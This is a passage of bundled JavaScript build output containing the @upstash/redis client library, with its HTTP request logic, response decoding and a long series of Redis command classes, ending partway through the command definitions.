var __create = Object.create;
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __getProtoOf = Object.getPrototypeOf;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __esm = (fn, res) => function __init() {
  return fn && (res = (0, fn[__getOwnPropNames(fn)[0]])(fn = 0)), res;
};
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};
var __copyProps = (to, from, except, desc) => {
  if (from && typeof from === "object" || typeof from === "function") {
    for (let key of __getOwnPropNames(from))
      if (!__hasOwnProp.call(to, key) && key !== except)
        __defProp(to, key, { get: () => from[key], enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable });
  }
  return to;
};
var __toESM = (mod, isNodeMode, target) => (target = mod != null ? __create(__getProtoOf(mod)) : {}, __copyProps(
  // If the importer is in node compatibility mode or this is not an ESM
  // file that has been converted to a CommonJS file using a Babel-
  // compatible transform (i.e. "__esModule" has not been set), then set
  // "default" to the CommonJS "module.exports" for node compatibility.
  isNodeMode || !mod || !mod.__esModule ? __defProp(target, "default", { value: mod, enumerable: true }) : target,
  mod
));
var __toCommonJS = (mod) => __copyProps(__defProp({}, "__esModule", { value: true }), mod);

// ../../node_modules/uncrypto/dist/crypto.node.mjs
var import_node_crypto, subtle;
var init_crypto_node = __esm({
  "../../node_modules/uncrypto/dist/crypto.node.mjs"() {
    import_node_crypto = __toESM(require("crypto"), 1);
    subtle = import_node_crypto.default.webcrypto?.subtle || {};
  }
});

// ../../node_modules/@upstash/redis/chunk-AIBLSL5D.mjs
function parseRecursive(obj) {
  const parsed = Array.isArray(obj) ? obj.map((o) => {
    try {
      return parseRecursive(o);
    } catch {
      return o;
    }
  }) : JSON.parse(obj);
  if (typeof parsed === "number" && parsed.toString() !== obj) {
    return obj;
  }
  return parsed;
}
function parseResponse(result) {
  try {
    return parseRecursive(result);
  } catch {
    return result;
  }
}
function deserializeScanResponse(result) {
  return [result[0], ...parseResponse(result.slice(1))];
}
function deserializeScanWithTypesResponse(result) {
  const [cursor, keys] = result;
  const parsedKeys = [];
  for (let i = 0; i < keys.length; i += 2) {
    parsedKeys.push({ key: keys[i], type: keys[i + 1] });
  }
  return [cursor, parsedKeys];
}
function mergeHeaders(...headers) {
  const merged = {};
  for (const header of headers) {
    if (!header) continue;
    for (const [key, value] of Object.entries(header)) {
      if (value !== void 0 && value !== null) {
        merged[key] = value;
      }
    }
  }
  return merged;
}
function base64decode(b64) {
  let dec = "";
  try {
    const binString = atob(b64);
    const size = binString.length;
    const bytes = new Uint8Array(size);
    for (let i = 0; i < size; i++) {
      bytes[i] = binString.charCodeAt(i);
    }
    dec = new TextDecoder().decode(bytes);
  } catch {
    dec = b64;
  }
  return dec;
}
function decode(raw) {
  let result = void 0;
  switch (typeof raw) {
    case "undefined": {
      return raw;
    }
    case "number": {
      result = raw;
      break;
    }
    case "object": {
      if (Array.isArray(raw)) {
        result = raw.map(
          (v) => typeof v === "string" ? base64decode(v) : Array.isArray(v) ? v.map((element) => decode(element)) : v
        );
      } else {
        result = null;
      }
      break;
    }
    case "string": {
      result = raw === "OK" ? "OK" : base64decode(raw);
      break;
    }
    default: {
      break;
    }
  }
  return result;
}
function merge(obj, key, value) {
  if (!value) {
    return obj;
  }
  obj[key] = obj[key] ? [obj[key], value].join(",") : value;
  return obj;
}
function deserialize(result) {
  if (result.length === 0) {
    return null;
  }
  const obj = {};
  for (let i = 0; i < result.length; i += 2) {
    const key = result[i];
    const value = result[i + 1];
    try {
      obj[key] = JSON.parse(value);
    } catch {
      obj[key] = value;
    }
  }
  return obj;
}
function transform(result) {
  const final = [];
  for (const pos of result) {
    if (!pos?.[0] || !pos?.[1]) {
      continue;
    }
    final.push({ lng: Number.parseFloat(pos[0]), lat: Number.parseFloat(pos[1]) });
  }
  return final;
}
function deserialize2(result) {
  if (result.length === 0) {
    return null;
  }
  const obj = {};
  for (let i = 0; i < result.length; i += 2) {
    const key = result[i];
    const value = result[i + 1];
    try {
      const valueIsNumberAndNotSafeInteger = !Number.isNaN(Number(value)) && !Number.isSafeInteger(Number(value));
      obj[key] = valueIsNumberAndNotSafeInteger ? value : JSON.parse(value);
    } catch {
      obj[key] = value;
    }
  }
  return obj;
}
function deserialize3(fields, result) {
  if (result.every((field) => field === null)) {
    return null;
  }
  const obj = {};
  for (const [i, field] of fields.entries()) {
    try {
      obj[field] = JSON.parse(result[i]);
    } catch {
      obj[field] = result[i];
    }
  }
  return obj;
}
function deserialize4(result) {
  const obj = {};
  for (const e of result) {
    for (let i = 0; i < e.length; i += 2) {
      const streamId = e[i];
      const entries = e[i + 1];
      if (!(streamId in obj)) {
        obj[streamId] = {};
      }
      for (let j = 0; j < entries.length; j += 2) {
        const field = entries[j];
        const value = entries[j + 1];
        try {
          obj[streamId][field] = JSON.parse(value);
        } catch {
          obj[streamId][field] = value;
        }
      }
    }
  }
  return obj;
}
function deserialize5(result) {
  const obj = {};
  for (const e of result) {
    for (let i = 0; i < e.length; i += 2) {
      const streamId = e[i];
      const entries = e[i + 1];
      if (!(streamId in obj)) {
        obj[streamId] = {};
      }
      for (let j = 0; j < entries.length; j += 2) {
        const field = entries[j];
        const value = entries[j + 1];
        try {
          obj[streamId][field] = JSON.parse(value);
        } catch {
          obj[streamId][field] = value;
        }
      }
    }
  }
  return obj;
}
function createAutoPipelineProxy(_redis, json) {
  const redis = _redis;
  if (!redis.autoPipelineExecutor) {
    redis.autoPipelineExecutor = new AutoPipelineExecutor(redis);
  }
  return new Proxy(redis, {
    get: (redis2, command) => {
      if (command === "pipelineCounter") {
        return redis2.autoPipelineExecutor.pipelineCounter;
      }
      if (command === "json") {
        return createAutoPipelineProxy(redis2, true);
      }
      const commandInRedisButNotPipeline = command in redis2 && !(command in redis2.autoPipelineExecutor.pipeline);
      const isCommandExcluded = EXCLUDE_COMMANDS.has(command);
      if (commandInRedisButNotPipeline || isCommandExcluded) {
        return redis2[command];
      }
      const isFunction = json ? typeof redis2.autoPipelineExecutor.pipeline.json[command] === "function" : typeof redis2.autoPipelineExecutor.pipeline[command] === "function";
      if (isFunction) {
        return (...args) => {
          return redis2.autoPipelineExecutor.withAutoPipeline((pipeline) => {
            if (json) {
              pipeline.json[command](
                ...args
              );
            } else {
              pipeline[command](...args);
            }
          });
        };
      }
      return redis2.autoPipelineExecutor.pipeline[command];
    }
  });
}
var __defProp2, __export2, error_exports, UpstashError, UrlError, HttpClient, defaultSerializer, Command, HRandFieldCommand, AppendCommand, BitCountCommand, BitFieldCommand, BitOpCommand, BitPosCommand, CopyCommand, DBSizeCommand, DecrCommand, DecrByCommand, DelCommand, EchoCommand, EvalROCommand, EvalCommand, EvalshaROCommand, EvalshaCommand, ExecCommand, ExistsCommand, ExpireCommand, ExpireAtCommand, FlushAllCommand, FlushDBCommand, GeoAddCommand, GeoDistCommand, GeoHashCommand, GeoPosCommand, GeoSearchCommand, GeoSearchStoreCommand, GetCommand, GetBitCommand, GetDelCommand, GetExCommand, GetRangeCommand, GetSetCommand, HDelCommand, HExistsCommand, HExpireCommand, HExpireAtCommand, HExpireTimeCommand, HPersistCommand, HPExpireCommand, HPExpireAtCommand, HPExpireTimeCommand, HPTtlCommand, HGetCommand, HGetAllCommand, HIncrByCommand, HIncrByFloatCommand, HKeysCommand, HLenCommand, HMGetCommand, HMSetCommand, HScanCommand, HSetCommand, HSetNXCommand, HStrLenCommand, HTtlCommand, HValsCommand, IncrCommand, IncrByCommand, IncrByFloatCommand, JsonArrAppendCommand, JsonArrIndexCommand, JsonArrInsertCommand, JsonArrLenCommand, JsonArrPopCommand, JsonArrTrimCommand, JsonClearCommand, JsonDelCommand, JsonForgetCommand, JsonGetCommand, JsonMergeCommand, JsonMGetCommand, JsonMSetCommand, JsonNumIncrByCommand, JsonNumMultByCommand, JsonObjKeysCommand, JsonObjLenCommand, JsonRespCommand, JsonSetCommand, JsonStrAppendCommand, JsonStrLenCommand, JsonToggleCommand, JsonTypeCommand, KeysCommand, LIndexCommand, LInsertCommand, LLenCommand, LMoveCommand, LmPopCommand, LPopCommand, LPosCommand, LPushCommand, LPushXCommand, LRangeCommand, LRemCommand, LSetCommand, LTrimCommand, MGetCommand, MSetCommand, MSetNXCommand, PersistCommand, PExpireCommand, PExpireAtCommand, PfAddCommand, PfCountCommand, PfMergeCommand, PingCommand, PSetEXCommand, PTtlCommand, PublishCommand, RandomKeyCommand, RenameCommand, RenameNXCommand, RPopCommand, RPushCommand, RPushXCommand, SAddCommand, ScanCommand, SCardCommand, ScriptExistsCommand, ScriptFlushCommand, ScriptLoadCommand, SDiffCommand, SDiffStoreCommand, SetCommand, SetBitCommand, SetExCommand, SetNxCommand, SetRangeCommand, SInterCommand, SInterStoreCommand, SIsMemberCommand, SMembersCommand, SMIsMemberCommand, SMoveCommand, SPopCommand, SRandMemberCommand, SRemCommand, SScanCommand, StrLenCommand, SUnionCommand, SUnionStoreCommand, TimeCommand, TouchCommand, TtlCommand, TypeCommand, UnlinkCommand, XAckCommand, XAddCommand, XAutoClaim, XClaimCommand, XDelCommand, XGroupCommand, XInfoCommand, XLenCommand, XPendingCommand, XRangeCommand, UNBALANCED_XREAD_ERR, XReadCommand, UNBALANCED_XREADGROUP_ERR, XReadGroupCommand, XRevRangeCommand, XTrimCommand, ZAddCommand, ZCardCommand, ZCountCommand, ZIncrByCommand, ZInterStoreCommand, ZLexCountCommand, ZPopMaxCommand, ZPopMinCommand, ZRangeCommand, ZRankCommand, ZRemCommand, ZRemRangeByLexCommand, ZRemRangeByRankCommand, ZRemRangeByScoreCommand, ZRevRankCommand, ZScanCommand, ZScoreCommand, ZUnionCommand, ZUnionStoreCommand, ZDiffStoreCommand, ZMScoreCommand, Pipeline, EXCLUDE_COMMANDS, AutoPipelineExecutor, PSubscribeCommand, Subscriber, SubscribeCommand, Script, ScriptRO, Redis, VERSION;
var init_chunk_AIBLSL5D = __esm({
  "../../node_modules/@upstash/redis/chunk-AIBLSL5D.mjs"() {
    init_crypto_node();
    init_crypto_node();
    __defProp2 = Object.defineProperty;
    __export2 = (target, all) => {
      for (var name in all)
        __defProp2(target, name, { get: all[name], enumerable: true });
    };
    error_exports = {};
    __export2(error_exports, {
      UpstashError: () => UpstashError,
      UrlError: () => UrlError
    });
    UpstashError = class extends Error {
      constructor(message) {
        super(message);
        this.name = "UpstashError";
      }
    };
    UrlError = class extends Error {
      constructor(url) {
        super(
          `Upstash Redis client was passed an invalid URL. You should pass a URL starting with https. Received: "${url}". `
        );
        this.name = "UrlError";
      }
    };
    HttpClient = class {
      baseUrl;
      headers;
      options;
      readYourWrites;
      upstashSyncToken = "";
      hasCredentials;
      retry;
      constructor(config) {
        this.options = {
          backend: config.options?.backend,
          agent: config.agent,
          responseEncoding: config.responseEncoding ?? "base64",
          // default to base64
          cache: config.cache,
          signal: config.signal,
          keepAlive: config.keepAlive ?? true
        };
        this.upstashSyncToken = "";
        this.readYourWrites = config.readYourWrites ?? true;
        this.baseUrl = (config.baseUrl || "").replace(/\/$/, "");
        const urlRegex = /^https?:\/\/[^\s#$./?].\S*$/;
        if (this.baseUrl && !urlRegex.test(this.baseUrl)) {
          throw new UrlError(this.baseUrl);
        }
        this.headers = {
          "Content-Type": "application/json",
          ...config.headers
        };
        this.hasCredentials = Boolean(this.baseUrl && this.headers.authorization.split(" ")[1]);
        if (this.options.responseEncoding === "base64") {
          this.headers["Upstash-Encoding"] = "base64";
        }
        this.retry = typeof config.retry === "boolean" && !config.retry ? {
          attempts: 1,
          backoff: () => 0
        } : {
          attempts: config.retry?.retries ?? 5,
          backoff: config.retry?.backoff ?? ((retryCount) => Math.exp(retryCount) * 50)
        };
      }
      mergeTelemetry(telemetry) {
        this.headers = merge(this.headers, "Upstash-Telemetry-Runtime", telemetry.runtime);
        this.headers = merge(this.headers, "Upstash-Telemetry-Platform", telemetry.platform);
        this.headers = merge(this.headers, "Upstash-Telemetry-Sdk", telemetry.sdk);
      }
      async request(req) {
        const requestHeaders = mergeHeaders(this.headers, req.headers ?? {});
        const requestUrl = [this.baseUrl, ...req.path ?? []].join("/");
        const isEventStream = requestHeaders.Accept === "text/event-stream";
        const signal = req.signal ?? this.options.signal;
        const isSignalFunction = typeof signal === "function";
        const requestOptions = {
          //@ts-expect-error this should throw due to bun regression
          cache: this.options.cache,
          method: "POST",
          headers: requestHeaders,
          body: JSON.stringify(req.body),
          keepalive: this.options.keepAlive,
          agent: this.options.agent,
          signal: isSignalFunction ? signal() : signal,
          /**
           * Fastly specific
           */
          backend: this.options.backend
        };
        if (!this.hasCredentials) {
          console.warn(
            "[Upstash Redis] Redis client was initialized without url or token. Failed to execute command."
          );
        }
        if (this.readYourWrites) {
          const newHeader = this.upstashSyncToken;
          this.headers["upstash-sync-token"] = newHeader;
        }
        let res = null;
        let error = null;
        for (let i = 0; i <= this.retry.attempts; i++) {
          try {
            res = await fetch(requestUrl, requestOptions);
            break;
          } catch (error_) {
            if (requestOptions.signal?.aborted && isSignalFunction) {
              throw error_;
            } else if (requestOptions.signal?.aborted) {
              const myBlob = new Blob([
                JSON.stringify({ result: requestOptions.signal.reason ?? "Aborted" })
              ]);
              const myOptions = {
                status: 200,
                statusText: requestOptions.signal.reason ?? "Aborted"
              };
              res = new Response(myBlob, myOptions);
              break;
            }
            error = error_;
            if (i < this.retry.attempts) {
              await new Promise((r) => setTimeout(r, this.retry.backoff(i)));
            }
          }
        }
        if (!res) {
          throw error ?? new Error("Exhausted all retries");
        }
        if (!res.ok) {
          const body2 = await res.json();
          throw new UpstashError(`${body2.error}, command was: ${JSON.stringify(req.body)}`);
        }
        if (this.readYourWrites) {
          const headers = res.headers;
          this.upstashSyncToken = headers.get("upstash-sync-token") ?? "";
        }
        if (isEventStream && req && req.onMessage && res.body) {
          const reader = res.body.getReader();
          const decoder = new TextDecoder();
          (async () => {
            try {
              while (true) {
                const { value, done } = await reader.read();
                if (done) break;
                const chunk = decoder.decode(value);
                const lines = chunk.split("\n");
                for (const line of lines) {
                  if (line.startsWith("data: ")) {
                    const data = line.slice(6);
                    req.onMessage?.(data);
                  }
                }
              }
            } catch (error2) {
              if (error2 instanceof Error && error2.name === "AbortError") {
              } else {
                console.error("Stream reading error:", error2);
              }
            } finally {
              try {
                await reader.cancel();
              } catch {
              }
            }
          })();
          return { result: 1 };
        }
        const body = await res.json();
        if (this.readYourWrites) {
          const headers = res.headers;
          this.upstashSyncToken = headers.get("upstash-sync-token") ?? "";
        }
        if (this.options.responseEncoding === "base64") {
          if (Array.isArray(body)) {
            return body.map(({ result: result2, error: error2 }) => ({
              result: decode(result2),
              error: error2
            }));
          }
          const result = decode(body.result);
          return { result, error: body.error };
        }
        return body;
      }
    };
    defaultSerializer = (c) => {
      switch (typeof c) {
        case "string":
        case "number":
        case "boolean": {
          return c;
        }
        default: {
          return JSON.stringify(c);
        }
      }
    };
    Command = class {
      command;
      serialize;
      deserialize;
      headers;
      path;
      onMessage;
      isStreaming;
      signal;
      /**
       * Create a new command instance.
       *
       * You can define a custom `deserialize` function. By default we try to deserialize as json.
       */
      constructor(command, opts) {
        this.serialize = defaultSerializer;
        this.deserialize = opts?.automaticDeserialization === void 0 || opts.automaticDeserialization ? opts?.deserialize ?? parseResponse : (x) => x;
        this.command = command.map((c) => this.serialize(c));
        this.headers = opts?.headers;
        this.path = opts?.path;
        this.onMessage = opts?.streamOptions?.onMessage;
        this.isStreaming = opts?.streamOptions?.isStreaming ?? false;
        this.signal = opts?.streamOptions?.signal;
        if (opts?.latencyLogging) {
          const originalExec = this.exec.bind(this);
          this.exec = async (client) => {
            const start = performance.now();
            const result = await originalExec(client);
            const end = performance.now();
            const loggerResult = (end - start).toFixed(2);
            console.log(
              `Latency for \x1B[38;2;19;185;39m${this.command[0].toString().toUpperCase()}\x1B[0m: \x1B[38;2;0;255;255m${loggerResult} ms\x1B[0m`
            );
            return result;
          };
        }
      }
      /**
       * Execute the command using a client.
       */
      async exec(client) {
        const { result, error } = await client.request({
          body: this.command,
          path: this.path,
          upstashSyncToken: client.upstashSyncToken,
          headers: this.headers,
          onMessage: this.onMessage,
          isStreaming: this.isStreaming,
          signal: this.signal
        });
        if (error) {
          throw new UpstashError(error);
        }
        if (result === void 0) {
          throw new TypeError("Request did not return a result");
        }
        return this.deserialize(result);
      }
    };
    HRandFieldCommand = class extends Command {
      constructor(cmd, opts) {
        const command = ["hrandfield", cmd[0]];
        if (typeof cmd[1] === "number") {
          command.push(cmd[1]);
        }
        if (cmd[2]) {
          command.push("WITHVALUES");
        }
        super(command, {
          // @ts-expect-error to silence compiler
          deserialize: cmd[2] ? (result) => deserialize(result) : opts?.deserialize,
          ...opts
        });
      }
    };
    AppendCommand = class extends Command {
      constructor(cmd, opts) {
        super(["append", ...cmd], opts);
      }
    };
    BitCountCommand = class extends Command {
      constructor([key, start, end], opts) {
        const command = ["bitcount", key];
        if (typeof start === "number") {
          command.push(start);
        }
        if (typeof end === "number") {
          command.push(end);
        }
        super(command, opts);
      }
    };
    BitFieldCommand = class {
      constructor(args, client, opts, execOperation = (command) => command.exec(this.client)) {
        this.client = client;
        this.opts = opts;
        this.execOperation = execOperation;
        this.command = ["bitfield", ...args];
      }
      command;
      chain(...args) {
        this.command.push(...args);
        return this;
      }
      get(...args) {
        return this.chain("get", ...args);
      }
      set(...args) {
        return this.chain("set", ...args);
      }
      incrby(...args) {
        return this.chain("incrby", ...args);
      }
      overflow(overflow) {
        return this.chain("overflow", overflow);
      }
      exec() {
        const command = new Command(this.command, this.opts);
        return this.execOperation(command);
      }
    };
    BitOpCommand = class extends Command {
      constructor(cmd, opts) {
        super(["bitop", ...cmd], opts);
      }
    };
    BitPosCommand = class extends Command {
      constructor(cmd, opts) {
        super(["bitpos", ...cmd], opts);
      }
    };
    CopyCommand = class extends Command {
      constructor([key, destinationKey, opts], commandOptions) {
        super(["COPY", key, destinationKey, ...opts?.replace ? ["REPLACE"] : []], {
          ...commandOptions,
          deserialize(result) {
            if (result > 0) {
              return "COPIED";
            }
            return "NOT_COPIED";
          }
        });
      }
    };
    DBSizeCommand = class extends Command {
      constructor(opts) {
        super(["dbsize"], opts);
      }
    };
    DecrCommand = class extends Command {
      constructor(cmd, opts) {
        super(["decr", ...cmd], opts);
      }
    };
    DecrByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["decrby", ...cmd], opts);
      }
    };
    DelCommand = class extends Command {
      constructor(cmd, opts) {
        super(["del", ...cmd], opts);
      }
    };
    EchoCommand = class extends Command {
      constructor(cmd, opts) {
        super(["echo", ...cmd], opts);
      }
    };
    EvalROCommand = class extends Command {
      constructor([script, keys, args], opts) {
        super(["eval_ro", script, keys.length, ...keys, ...args ?? []], opts);
      }
    };
    EvalCommand = class extends Command {
      constructor([script, keys, args], opts) {
        super(["eval", script, keys.length, ...keys, ...args ?? []], opts);
      }
    };
    EvalshaROCommand = class extends Command {
      constructor([sha, keys, args], opts) {
        super(["evalsha_ro", sha, keys.length, ...keys, ...args ?? []], opts);
      }
    };
    EvalshaCommand = class extends Command {
      constructor([sha, keys, args], opts) {
        super(["evalsha", sha, keys.length, ...keys, ...args ?? []], opts);
      }
    };
    ExecCommand = class extends Command {
      constructor(cmd, opts) {
        const normalizedCmd = cmd.map((arg) => typeof arg === "string" ? arg : String(arg));
        super(normalizedCmd, opts);
      }
    };
    ExistsCommand = class extends Command {
      constructor(cmd, opts) {
        super(["exists", ...cmd], opts);
      }
    };
    ExpireCommand = class extends Command {
      constructor(cmd, opts) {
        super(["expire", ...cmd.filter(Boolean)], opts);
      }
    };
    ExpireAtCommand = class extends Command {
      constructor(cmd, opts) {
        super(["expireat", ...cmd], opts);
      }
    };
    FlushAllCommand = class extends Command {
      constructor(args, opts) {
        const command = ["flushall"];
        if (args && args.length > 0 && args[0].async) {
          command.push("async");
        }
        super(command, opts);
      }
    };
    FlushDBCommand = class extends Command {
      constructor([opts], cmdOpts) {
        const command = ["flushdb"];
        if (opts?.async) {
          command.push("async");
        }
        super(command, cmdOpts);
      }
    };
    GeoAddCommand = class extends Command {
      constructor([key, arg1, ...arg2], opts) {
        const command = ["geoadd", key];
        if ("nx" in arg1 && arg1.nx) {
          command.push("nx");
        } else if ("xx" in arg1 && arg1.xx) {
          command.push("xx");
        }
        if ("ch" in arg1 && arg1.ch) {
          command.push("ch");
        }
        if ("latitude" in arg1 && arg1.latitude) {
          command.push(arg1.longitude, arg1.latitude, arg1.member);
        }
        command.push(
          ...arg2.flatMap(({ latitude, longitude, member }) => [longitude, latitude, member])
        );
        super(command, opts);
      }
    };
    GeoDistCommand = class extends Command {
      constructor([key, member1, member2, unit = "M"], opts) {
        super(["GEODIST", key, member1, member2, unit], opts);
      }
    };
    GeoHashCommand = class extends Command {
      constructor(cmd, opts) {
        const [key] = cmd;
        const members = Array.isArray(cmd[1]) ? cmd[1] : cmd.slice(1);
        super(["GEOHASH", key, ...members], opts);
      }
    };
    GeoPosCommand = class extends Command {
      constructor(cmd, opts) {
        const [key] = cmd;
        const members = Array.isArray(cmd[1]) ? cmd[1] : cmd.slice(1);
        super(["GEOPOS", key, ...members], {
          deserialize: (result) => transform(result),
          ...opts
        });
      }
    };
    GeoSearchCommand = class extends Command {
      constructor([key, centerPoint, shape, order, opts], commandOptions) {
        const command = ["GEOSEARCH", key];
        if (centerPoint.type === "FROMMEMBER" || centerPoint.type === "frommember") {
          command.push(centerPoint.type, centerPoint.member);
        }
        if (centerPoint.type === "FROMLONLAT" || centerPoint.type === "fromlonlat") {
          command.push(centerPoint.type, centerPoint.coordinate.lon, centerPoint.coordinate.lat);
        }
        if (shape.type === "BYRADIUS" || shape.type === "byradius") {
          command.push(shape.type, shape.radius, shape.radiusType);
        }
        if (shape.type === "BYBOX" || shape.type === "bybox") {
          command.push(shape.type, shape.rect.width, shape.rect.height, shape.rectType);
        }
        command.push(order);
        if (opts?.count) {
          command.push("COUNT", opts.count.limit, ...opts.count.any ? ["ANY"] : []);
        }
        const transform2 = (result) => {
          if (!opts?.withCoord && !opts?.withDist && !opts?.withHash) {
            return result.map((member) => {
              try {
                return { member: JSON.parse(member) };
              } catch {
                return { member };
              }
            });
          }
          return result.map((members) => {
            let counter = 1;
            const obj = {};
            try {
              obj.member = JSON.parse(members[0]);
            } catch {
              obj.member = members[0];
            }
            if (opts.withDist) {
              obj.dist = Number.parseFloat(members[counter++]);
            }
            if (opts.withHash) {
              obj.hash = members[counter++].toString();
            }
            if (opts.withCoord) {
              obj.coord = {
                long: Number.parseFloat(members[counter][0]),
                lat: Number.parseFloat(members[counter][1])
              };
            }
            return obj;
          });
        };
        super(
          [
            ...command,
            ...opts?.withCoord ? ["WITHCOORD"] : [],
            ...opts?.withDist ? ["WITHDIST"] : [],
            ...opts?.withHash ? ["WITHHASH"] : []
          ],
          {
            deserialize: transform2,
            ...commandOptions
          }
        );
      }
    };
    GeoSearchStoreCommand = class extends Command {
      constructor([destination, key, centerPoint, shape, order, opts], commandOptions) {
        const command = ["GEOSEARCHSTORE", destination, key];
        if (centerPoint.type === "FROMMEMBER" || centerPoint.type === "frommember") {
          command.push(centerPoint.type, centerPoint.member);
        }
        if (centerPoint.type === "FROMLONLAT" || centerPoint.type === "fromlonlat") {
          command.push(centerPoint.type, centerPoint.coordinate.lon, centerPoint.coordinate.lat);
        }
        if (shape.type === "BYRADIUS" || shape.type === "byradius") {
          command.push(shape.type, shape.radius, shape.radiusType);
        }
        if (shape.type === "BYBOX" || shape.type === "bybox") {
          command.push(shape.type, shape.rect.width, shape.rect.height, shape.rectType);
        }
        command.push(order);
        if (opts?.count) {
          command.push("COUNT", opts.count.limit, ...opts.count.any ? ["ANY"] : []);
        }
        super([...command, ...opts?.storeDist ? ["STOREDIST"] : []], commandOptions);
      }
    };
    GetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["get", ...cmd], opts);
      }
    };
    GetBitCommand = class extends Command {
      constructor(cmd, opts) {
        super(["getbit", ...cmd], opts);
      }
    };
    GetDelCommand = class extends Command {
      constructor(cmd, opts) {
        super(["getdel", ...cmd], opts);
      }
    };
    GetExCommand = class extends Command {
      constructor([key, opts], cmdOpts) {
        const command = ["getex", key];
        if (opts) {
          if ("ex" in opts && typeof opts.ex === "number") {
            command.push("ex", opts.ex);
          } else if ("px" in opts && typeof opts.px === "number") {
            command.push("px", opts.px);
          } else if ("exat" in opts && typeof opts.exat === "number") {
            command.push("exat", opts.exat);
          } else if ("pxat" in opts && typeof opts.pxat === "number") {
            command.push("pxat", opts.pxat);
          } else if ("persist" in opts && opts.persist) {
            command.push("persist");
          }
        }
        super(command, cmdOpts);
      }
    };
    GetRangeCommand = class extends Command {
      constructor(cmd, opts) {
        super(["getrange", ...cmd], opts);
      }
    };
    GetSetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["getset", ...cmd], opts);
      }
    };
    HDelCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hdel", ...cmd], opts);
      }
    };
    HExistsCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hexists", ...cmd], opts);
      }
    };
    HExpireCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields, seconds, option] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(
          [
            "hexpire",
            key,
            seconds,
            ...option ? [option] : [],
            "FIELDS",
            fieldArray.length,
            ...fieldArray
          ],
          opts
        );
      }
    };
    HExpireAtCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields, timestamp, option] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(
          [
            "hexpireat",
            key,
            timestamp,
            ...option ? [option] : [],
            "FIELDS",
            fieldArray.length,
            ...fieldArray
          ],
          opts
        );
      }
    };
    HExpireTimeCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(["hexpiretime", key, "FIELDS", fieldArray.length, ...fieldArray], opts);
      }
    };
    HPersistCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(["hpersist", key, "FIELDS", fieldArray.length, ...fieldArray], opts);
      }
    };
    HPExpireCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields, milliseconds, option] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(
          [
            "hpexpire",
            key,
            milliseconds,
            ...option ? [option] : [],
            "FIELDS",
            fieldArray.length,
            ...fieldArray
          ],
          opts
        );
      }
    };
    HPExpireAtCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields, timestamp, option] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(
          [
            "hpexpireat",
            key,
            timestamp,
            ...option ? [option] : [],
            "FIELDS",
            fieldArray.length,
            ...fieldArray
          ],
          opts
        );
      }
    };
    HPExpireTimeCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(["hpexpiretime", key, "FIELDS", fieldArray.length, ...fieldArray], opts);
      }
    };
    HPTtlCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(["hpttl", key, "FIELDS", fieldArray.length, ...fieldArray], opts);
      }
    };
    HGetCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hget", ...cmd], opts);
      }
    };
    HGetAllCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hgetall", ...cmd], {
          deserialize: (result) => deserialize2(result),
          ...opts
        });
      }
    };
    HIncrByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hincrby", ...cmd], opts);
      }
    };
    HIncrByFloatCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hincrbyfloat", ...cmd], opts);
      }
    };
    HKeysCommand = class extends Command {
      constructor([key], opts) {
        super(["hkeys", key], opts);
      }
    };
    HLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hlen", ...cmd], opts);
      }
    };
    HMGetCommand = class extends Command {
      constructor([key, ...fields], opts) {
        super(["hmget", key, ...fields], {
          deserialize: (result) => deserialize3(fields, result),
          ...opts
        });
      }
    };
    HMSetCommand = class extends Command {
      constructor([key, kv], opts) {
        super(["hmset", key, ...Object.entries(kv).flatMap(([field, value]) => [field, value])], opts);
      }
    };
    HScanCommand = class extends Command {
      constructor([key, cursor, cmdOpts], opts) {
        const command = ["hscan", key, cursor];
        if (cmdOpts?.match) {
          command.push("match", cmdOpts.match);
        }
        if (typeof cmdOpts?.count === "number") {
          command.push("count", cmdOpts.count);
        }
        super(command, {
          deserialize: deserializeScanResponse,
          ...opts
        });
      }
    };
    HSetCommand = class extends Command {
      constructor([key, kv], opts) {
        super(["hset", key, ...Object.entries(kv).flatMap(([field, value]) => [field, value])], opts);
      }
    };
    HSetNXCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hsetnx", ...cmd], opts);
      }
    };
    HStrLenCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hstrlen", ...cmd], opts);
      }
    };
    HTtlCommand = class extends Command {
      constructor(cmd, opts) {
        const [key, fields] = cmd;
        const fieldArray = Array.isArray(fields) ? fields : [fields];
        super(["httl", key, "FIELDS", fieldArray.length, ...fieldArray], opts);
      }
    };
    HValsCommand = class extends Command {
      constructor(cmd, opts) {
        super(["hvals", ...cmd], opts);
      }
    };
    IncrCommand = class extends Command {
      constructor(cmd, opts) {
        super(["incr", ...cmd], opts);
      }
    };
    IncrByCommand = class extends Command {
      constructor(cmd, opts) {
        super(["incrby", ...cmd], opts);
      }
    };
    IncrByFloatCommand = class extends Command {
      constructor(cmd, opts) {
